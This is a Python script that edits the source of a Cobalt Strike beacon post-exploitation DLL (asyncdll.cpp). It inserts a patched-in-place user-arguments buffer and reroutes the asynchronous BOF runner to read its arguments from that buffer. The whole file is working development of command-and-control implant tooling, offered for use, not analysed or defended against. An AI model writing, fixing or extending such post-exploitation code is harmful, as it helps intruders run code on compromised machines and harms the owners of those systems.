from pathlib import Path

p = Path(r"C:\Users\Administrator\Desktop\cobaltstrike\cobaltstrike-beacon\feat-post-4.9.1\tools\asyncbof\asyncdll.cpp")
t = p.read_bytes()
NL = b"\r\n" if b"\r\n" in t[:400] else b"\n"

# 1. add the user-args marker buffer next to the kit globals
old_globals = (b'volatile const char gPipeName[] = "\\\\\\\\.\\\\pipe\\\\POST_EX_PIPE_NAME_PLEASE_DO_NOT_CHANGE_OR_REMOVE";' + NL +
               b'volatile char gPostexArgumentsBuffer[20] = "_POSTEX_ARGUMENTS_";')
new_globals = old_globals + (NL +
               b'volatile char gUserArgs[256] = "__POSTEX_USER_ARGS__";')
assert old_globals in t
t = t.replace(old_globals, new_globals, 1)

# 2. run_async: read the blob from gUserArgs (patched in place by the client),
#    NOT from lpReserved (the loader hands lpReserved = loader base)
old_head = (b'static void run_async(LPVOID raw) {' + NL +
            b'\tPOSTEX_ARGUMENTS * pa = (POSTEX_ARGUMENTS *)gPostexArgumentsBuffer;' + NL +
            b'\tint blobLen = pa->userArgumentBufferSize;' + NL +
            b'\tDATAP d;' + NL +
            b'\tint runOnce, tl = 0, pl = 0, bl = 0;' + NL +
            b'\tchar * pipeName, * bof;' + NL +
            NL +
            b'\td.b = (char *)raw;' + NL +
            b'\td.n = blobLen > 0 ? blobLen : 0x100000;')
new_head = (b'static void run_async(LPVOID raw) {' + NL +
            b'\t/* C-19 root cause: the postex loader hands lpReserved = LOADER BASE;' + NL +
            b' \t * the real args live in the __POSTEX_USER_ARGS__ buffer patched' + NL +
            b' \t * in-place by ExecuteDllJob.fix (256B cap). Same contract as the kit.' + NL +
            b' \t */' + NL +
            b'\tPOSTEX_ARGUMENTS * pa = (POSTEX_ARGUMENTS *)gPostexArgumentsBuffer;' + NL +
            b'\tint blobLen = pa->userArgumentBufferSize;' + NL +
            b'\tDATAP d;' + NL +
            b'\tint runOnce, tl = 0, pl = 0, bl = 0;' + NL +
            b'\tchar * pipeName, * bof;' + NL +
            NL +
            b'\td.b = (char *)gUserArgs;' + NL +
            b'\td.n = blobLen > 0 ? blobLen : 0x100000;')
assert old_head in t
t = t.replace(old_head, new_head, 1)
p.write_bytes(t)
print("asyncdll: user-args source switched to __POSTEX_USER_ARGS__")
